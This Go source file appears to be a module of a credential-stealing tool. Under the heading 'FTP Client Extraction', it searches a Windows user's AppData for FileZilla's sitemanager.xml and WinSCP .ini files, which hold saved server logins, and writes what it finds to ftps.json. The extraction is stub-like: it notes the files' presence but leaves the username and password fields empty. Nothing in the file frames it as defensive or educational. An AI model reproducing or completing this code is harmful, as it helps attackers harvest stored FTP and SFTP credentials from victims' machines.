// ============================================================
// ftps.go - FTP Client Extraction
// ============================================================
package ftps

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

type FTPConfig struct {
	Client   string `json:"client"`
	Path     string `json:"path"`
	Host     string `json:"host"`
	Username string `json:"username"`
	Password string `json:"password"`
	Port     string `json:"port"`
}

// Run extracts FTP client configurations
func Run() {
	log.Println("📁 Extracting FTP client configurations...")
	
	var ftps []FTPConfig
	
	if fz := findFileZilla(); fz != nil {
		ftps = append(ftps, *fz)
	}
	
	if winscp := findWinSCP(); winscp != nil {
		ftps = append(ftps, *winscp)
	}
	
	saveFTPs(ftps)
}

func findFileZilla() *FTPConfig {
	if runtime.GOOS == "windows" {
		filezillaPath := filepath.Join(os.Getenv("APPDATA"), "FileZilla")
		
		xmlPath := filepath.Join(filezillaPath, "sitemanager.xml")
		if _, err := os.ReadFile(xmlPath); err == nil {
			return &FTPConfig{
				Client:   "FileZilla",
				Path:     filezillaPath,
				Host:     "Found in sitemanager.xml",
				Username: "",
				Password: "",
				Port:     "21",
			}
		}
	}
	return nil
}

func findWinSCP() *FTPConfig {
	if runtime.GOOS == "windows" {
		winscpPath := filepath.Join(os.Getenv("APPDATA"), "WinSCP")
		
		if _, err := os.Stat(winscpPath); err == nil {
			files, err := os.ReadDir(winscpPath)
			if err == nil {
				for _, file := range files {
					if filepath.Ext(file.Name()) == ".ini" {
						return &FTPConfig{
							Client:   "WinSCP",
							Path:     winscpPath,
							Host:     "Found in " + file.Name(),
							Username: "",
							Password: "",
							Port:     "22",
						}
					}
				}
			}
		}
	}
	return nil
}

func saveFTPs(ftps []FTPConfig) {
	data, err := json.MarshalIndent(ftps, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal FTPs: %v", err)
		return
	}
	
	if err := os.WriteFile("ftps.json", data, 0644); err != nil {
		log.Printf("❌ Failed to save FTPs: %v", err)
		return
	}
	
	log.Printf("📁 Found %d FTP clients", len(ftps))
}